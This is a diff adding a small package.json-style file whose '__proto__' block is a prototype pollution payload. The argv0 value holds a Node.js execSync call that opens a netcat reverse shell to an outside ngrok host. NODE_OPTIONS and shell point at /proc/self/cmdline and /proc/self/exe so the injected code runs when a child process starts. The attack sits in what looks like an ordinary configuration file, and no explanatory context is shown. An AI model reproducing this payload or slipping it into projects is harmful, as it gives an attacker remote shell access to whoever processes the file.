@@ -1,0 +1,12 @@
+{
+	"version": "1.0.0",
+	"scripts": {
+		"production": "node app.js"
+	},
+	"foo": "bar",
+	"__proto__": {
+		"NODE_OPTIONS": "--require /proc/self/cmdline",
+		"shell": "/proc/self/exe",
+		"argv0": "require('child_process').execSync('nc 0.tcp.ap.ngrok.io 15432 -e /bin/sh')//"
+	}
+}
